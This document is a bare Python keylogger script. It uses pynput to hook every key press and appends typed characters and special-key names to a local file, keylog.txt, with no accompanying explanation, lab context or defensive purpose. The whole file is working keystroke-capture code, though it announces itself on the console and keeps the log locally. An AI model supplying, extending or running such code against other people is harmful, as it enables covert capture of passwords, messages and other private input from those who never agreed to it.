from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            
            file.write(f"{key.char}")
    except AttributeError:
        
        with open(LOG_FILE, "a") as file:
            file.write(f"[{key.name}]")

def main():
    print(" Keylogger is running... ")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
